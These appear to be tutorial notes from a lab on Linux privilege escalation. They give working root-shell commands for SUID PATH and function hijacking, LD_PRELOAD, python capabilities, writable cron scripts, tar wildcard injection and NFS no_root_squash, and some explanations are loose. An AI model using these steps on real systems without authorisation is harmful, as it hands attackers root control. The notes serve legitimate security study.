## Enumeration is the key.
Privilege escalation is all about:

*    Collect - Enumeration, more enumeration and some more enumeration.
*    Process - Sort through data, analyse and prioritisation.
*    Search - Know what to search for and where to find the exploit code.
*    Adapt - Customize the exploit, so it fits. Not every exploit work for every system "out of the box".
*    Try - Get ready for (lots of) trial and error.

## Symlink & Environment Variable Exploit



* In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
* From the output, make note of all the SUID binaries.
* In command prompt type: `strings /usr/local/bin/suid-env`
* From the output, notice the functions used by the binary.

## Exploitation

* In command prompt type:
```sh
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```
* In command prompt type: 
```sh
gcc /tmp/service.c -o /tmp/service
```
* In command prompt type: 
```sh
export PATH=/tmp:$PATH
```
* In command prompt type: 
```sh
/usr/local/bin/suid-env
```
* In command prompt type: 
```sh
id
```


* In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
* From the output, make note of all the SUID binaries.
* In command prompt type: `strings /usr/local/bin/suid-env2`
* From the output, notice the functions used by the binary.

## Exploitation ENV2



* In command prompt type:
```sh
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
```
**Explanation:** This function overrides the default `/usr/sbin/service` command. Instead of executing the intended service, it copies `/bin/bash` to `/tmp/`, assigns it SUID permissions, and executes it with elevated privileges.
* In command prompt type:
```sh
export -f /usr/sbin/service
```
**Explanation:** This command ensures that our malicious function is exported to the environment so that it gets executed when `/usr/local/bin/suid-env2` calls `service`.
* In command prompt type:
```sh
/usr/local/bin/suid-env2
```
**Explanation:** Since `suid-env2` runs as root and calls `/usr/sbin/service`, our function is executed instead, allowing us to escalate privileges.
* In command prompt type:
```sh
id
```
**Explanation:** This verifies that we have gained root access.
* In command prompt type:
```sh
whoami
```
**Explanation:** Confirms that the user is now root, completing the privilege escalation attack.

## Summary of SUID-Based Privilege Escalation

SUID (Set User ID) is a special file permission in Linux that allows executables to run with the permissions of the file owner instead of the executing user. If an SUID binary is owned by root, it can be exploited to escalate privileges to root if misconfigured.
Key SUID Privilege Escalation Techniques

**Finding SUID Binaries**
    Use the following command to list all binaries with the SUID bit set:

```sh
find / -type f -perm -04000 -ls 2>/dev/null
```
Any SUID binary owned by root could be a potential target.

Identifying Vulnerabilities in SUID Binaries

Analyze the binary using strings:
```sh
    strings /path/to/suid-binary
```
    Look for calls to system(), execve(), or references to other commands.

Exploiting SUID Binaries

    Symlink & Environment Variable Exploit (as seen in suid-env2)
        Override a command that the SUID binary relies on by defining a custom function and exporting it.
        When the SUID binary executes the command, it runs the attacker’s function instead, leading to privilege escalation.

    SUID Binary Execution with Controlled Input
        If an SUID binary allows executing external commands, an attacker can inject a malicious command.

`/path/to/suid-binary "/bin/sh"`

LD_PRELOAD Exploit (Library Hijacking)

    If an SUID binary allows setting the LD_PRELOAD environment variable, an attacker can preload a malicious shared library:

```sh
echo 'void _init() { setgid(0); setuid(0); system("/bin/bash"); }' > exploit.c
gcc -shared -o /tmp/exploit.so -fPIC exploit.c
sudo LD_PRELOAD=/tmp/exploit.so /path/to/suid-binary
```
SUID Shell Injection (Direct File Execution)

    Copy bash to a writable directory and set the SUID bit:
```sh
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p
```



## Capabilities 

For the purpose of performing permission checks, traditional UNIX implementations distinguish two categories of processes: privileged processes (whose effective user ID is 0, referred to as superuser or root), and unprivileged processes (whose effective UID is nonzero). Privileged processes bypass all kernel permission checks, while unprivileged processes are subject to full permission checking based on the process’s credentials (usually: effective UID, effective GID, and supplementary group list). Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuser into distinct units, known as capabilities, which can be independently enabled and disabled. Capabilities are a per-thread attribute.


* This would not come up with searching SUID's, so it is important to check!


* In command prompt type: `getcap -r / 2>/dev/null`
* From the output, notice the value of the “cap_setuid” capability.
* Having the capability `=ep` means the binary has all the capabilities.
Exploitation

Alternatively the following capabilities can be used in order to upgrade your current privileges.

```sh
cap_dac_read_search # read anything
cap_setuid+ep # setuid
```

* In command prompt type:
`/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
* Enjoy root!


## Priv Esc Via Cron


## Understanding Cron Job Privilege Escalation
Cron jobs are scheduled tasks that run automatically in Linux. If a cron job is misconfigured to execute a script that a low-privileged user can modify, it can be abused for privilege escalation.

### Identifying Vulnerable Cron Jobs
To check system-wide cron jobs:
```sh
cat /etc/crontab
```
Example output:
```sh
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```
- These jobs run **every minute** (`* * * * *`) as **root**.
- The script `overwrite.sh` is executed **without an absolute path**, meaning the system searches for it in directories listed in `$PATH`, including user-writable locations.

### Exploiting a Writable Script
If `overwrite.sh` is writable by a low-privileged user, they can modify it to escalate privileges:
```sh
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
```
**Explanation:**
- This script **copies** `/bin/bash` to `/tmp/bash`.
- Sets the **SUID** bit (`chmod +s`), allowing it to always execute as root.

### Gaining Root Access
Once the cron job executes, the attacker runs:
```sh
/tmp/bash -p
```
**Verification:**
```sh
id
```
Example output:
```sh
uid=1000(TCM) gid=1000(user) euid=0(root)
```
The **effective user ID (`euid=0`) is root**, confirming privilege escalation.

!!!importanat 
    One of the most comon cron jobs Priv Esc technique is the file overwrites!

## Why Does This Work?
- **Cron jobs execute scripts as root**.
- **No absolute path in the cron job** allows execution of user-controlled scripts.
- **Writable scripts in `$PATH`** enable privilege escalation.



## Escalation via Cron Wildcards

```sh
* * * * * root /usr/local/bin/compress.sh

TCM@debian:~$ cat /usr/local/bin/compress.sh 
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz * `<----- backup via a wild card `
TCM@debian:~$ 

```
We can do injection.

`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh`

 `touch /home/user/--checkpoint=1`
 `touch /home/user/--checkpoint-action=exec=sh\ runme.sh`


These two commands are used to exploit certain vulnerable versions of tar by tricking it into executing a malicious script. This technique is part of Linux Privilege Escalation via Arbitrary File Execution in tar.

## Command 1

* touch creates an empty file named --checkpoint=1.
* In vulnerable versions of tar, the --checkpoint option prints a message after processing every file.
* Here, --checkpoint=1 forces tar to print a message after processing one file.

## Command 2 

* touch creates another file named --checkpoint-action=exec=sh runme.sh.
* The --checkpoint-action flag in vulnerable tar versions allows executing commands when a checkpoint is hit.
* In this case, when tar processes the file, it will execute:

`sh runme.sh`

* This runs runme.sh as the user who executed tar.
  If tar is run as root, the script executes as root.

`/tmp/bash -p`

**misconfigured cron jobs** can allow privilege escalation. Implementing security best practices can mitigate this risk.

**Check systemd timers as well !!**


## Privilege Escalation Via NFS Root squashing 

This is an NFS (Network File System) misconfiguration exploit where root permissions can be abused due to the no_root_squash option.
What is NFS Root Squashing?

    NFS (Network File System) allows files to be shared over a network.
    Normally, when an NFS client mounts a remote directory, any action performed as root on the client should not be treated as root on the server. Instead, it is mapped to an unprivileged user (like nobody).
    This protection is called "root squashing".

* The Vulnerability

    If the no_root_squash option is enabled in /etc/exports, root actions on the client are executed as root on the NFS server.
    This allows an attacker to create and execute root-owned binaries remotely.


Exploiting no_root_squash for Root Access
* Check NFS Export Configuration

`cat /etc/exports`

Example output:

`/tmp *(rw,no_root_squash)`

    /tmp is exported to all clients (* means anyone can mount it).
    rw → Clients can write to this share.
    no_root_squash → Root user on client = Root user on server (Vulnerable!)

* Identify Shared NFS Directories

`showmount -e 10.10.171.100`

This lists all exported (shared) NFS directories.

Example output:

Export list for 10.10.171.100:
/tmp *

This confirms /tmp is shared.
*  Mount the NFS Share

Create a local directory:

mkdir /tmp/1

Mount the remote /tmp directory:

`mount -o rw,vers=2 10.10.171.100:/tmp /tmp/1`

    -o rw → Mount with read/write permissions.
    vers=2 → Use NFS version 2 (adjust if needed).

Now, anything written in /tmp/1 is actually written to the remote /tmp on the NFS server.
* Create a SUID Binary to Get Root

Now that we have root privileges on the NFS share, let's create and compile a root shell.
Write the Root Shell Code

`echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c`

    This simple C program will launch a root shell when executed.

Compile the Program

`gcc /tmp/1/x.c -o /tmp/1/x`

    This creates an executable binary named `x.`

Set the SUID Bit

`chmod +s /tmp/1/x`

    SUID (chmod +s) allows the program to run as root, even for normal users.

* Execute the Root Shell

Now, exit the NFS mount and try running the backdoor shell:

`/tmp/1/x`

Then, verify if we got root access:

`id`

If successful, output should be:

uid=0(root) gid=0(root) groups=0(root)

## Spawn a Fully Interactive TTY Shell

If you're www-data, try upgrading your shell:

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
